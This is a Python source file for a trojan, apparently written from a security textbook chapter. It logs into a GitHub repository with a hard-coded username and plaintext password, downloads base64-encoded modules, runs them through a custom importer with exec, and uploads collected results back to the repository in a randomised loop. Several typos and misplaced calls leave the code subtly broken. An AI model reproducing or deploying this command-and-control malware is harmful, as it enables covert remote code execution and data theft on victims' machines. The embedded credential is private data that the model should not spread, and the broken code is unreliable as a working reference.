#!/usr/bin/env python
#coding:utf-8

import json
import base64
import sys
import time
import random
import imp
import threading
import queue
import os


import github3


trojan_id = 'abc'

trojan_config = "%s.json" % trojan_id
trajon_moudles = []
configured = False
task_queue = queue.Queue()

def run(**args):
    print("[*] in listmodules")
    files = os.listdir('.')
    return str(files)


def connect_github():
    gh = github3.login(username='LxkdGitHub', password="17271119lxkdgithub")
    repo = gh.repository('LxkdGitHub', 'chapter7')
    branch = repo.branch('master')

    return gh,repo,branch

def get_file_contents(filepath):

    gf,repo,branch = connect_github()
    tree = branch.commit.commit.tree.recurse()

    for filename in tree.tree:

        if filepath in filename.path:
            print("[*] Found file %s " % filepath)
            blob = repo.blob(filename._json_data['sha'])
            return blob.content

    return None

def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True

    for task in config:

        if task['mdule'] not in sys.modules:

            exec("import %s" % task['module'])

        return config

def store_module_result(data):

    gh,repo,branch = connect_github()
    remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000, 100000))
    repo.create_file(remote_path, "Commit message", base64.b64encode(data))

    return


class GitImporter():
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        if configured:
            print("Attempting to retrieve %s" % fullname)
            new_library = get_file_contents("modules/%s" % fullname)

            if new_library is not None:
                self.current_moudle_code = base64.b64decode(new_library)
                return self


        return None
    def load_module(self, name):

        module = imp.new_module(name)
        exec(self.current_module_code in module.__dict__)
        sys.modules[name] = module

        return module




def module_runner(module):

    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()

    #保存结果到repo中
    store_module_result(result)

    return

#木马的主循环
sys.meta_path = [GitImporter]

while True:

    if task_queue.empty():

        config = get_trojan_config()

        for task in config:
            t = threading.Thread(target=module_runner, args=(task['module']))
            t.start()
            time.sleep(random.randint(1,10))

    time.sleep(random.randint(1000, 10000))
















